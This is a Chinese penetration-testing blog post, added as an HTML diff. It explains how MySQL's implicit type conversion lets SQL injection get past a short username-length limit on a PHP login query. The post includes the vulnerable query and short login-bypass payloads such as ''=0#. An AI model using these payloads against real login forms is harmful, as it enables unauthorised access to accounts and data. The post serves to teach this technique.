@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>SQL隐形弱类型转换绕过</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/sql-waf-bypass.html" rel="bookmark"
+           title="Permalink to SQL隐形弱类型转换绕过">SQL隐形弱类型转换绕过</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2017-01-05T00:00:00+01:00">
+                <a href='#'>01/05/2017 </a>
+                <a href="/category/sql.html">SQL</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <p><a href="https://tom.vg/2013/04/mysql-implicit-type-conversion/">https://tom.vg/2013/04/mysql-implicit-type-conversion/</a>
+<a href="https://www.t00ls.net/articles-24308.html">https://www.t00ls.net/articles-24308.html</a></p>
+<p>如果PHP语句中存在这样的登录漏洞比如：</p>
+<p><code>$sql="select * from users where id='".$user."' and password='".md5($pass)."';</code></p>
+<p>但是在登录框处限制了用户名长度</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="ss">(</span><span class="k">strlen</span><span class="ss">(</span>$<span class="nv">user</span><span class="ss">)</span><span class="o">&gt;</span><span class="mi">4</span><span class="ss">)</span>{
+<span class="nv">print</span> <span class="s2">&quot;</span><span class="s">用户名不能超过4个字符串</span><span class="s2">&quot;</span><span class="c1">;</span>
+<span class="nv">echo</span> $<span class="nv">user</span><span class="c1">;</span>
+<span class="nv">echo</span> <span class="k">strlen</span><span class="ss">(</span>$<span class="nv">user</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">die</span><span class="ss">()</span><span class="c1">;</span>
+}
+</pre></div>
+
+
+<p>如果未做限制的情况下可以构造这样的语句
+<code>select * from users where userid = 1 or 1=1</code></p>
+<p>在限制的情况下可以利用sql隐形转换这样子：
+<code>select * from users where userid=''=0#</code></p>
+<p>这个就全部选择出来了，然后重要的点在后面<code>userid=''=0#</code>，闭合前面单引号，于是整个数值就恒等于了，也可以这么写</p>
+<p><code>userid=''=false#</code>,<code>userid=''=(1-1)</code>,<code>userid='a'=0</code></p>
+<p>基本原理就是上面文章提到的：</p>
+<p>算数操作符<code>+</code>会将字符型的user转换为数值型的user，
+<code>dah</code>,<code>tagi</code>,<code>admin</code>对应的数值是0，
+<code>1232dfs</code>，<code>123idu</code>对应的数值是123。</p>
+<p>除去<code>+</code>号，其他操作符也会发生类型转换比如<code>MOD,DIV,*,/,%, -</code></p>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
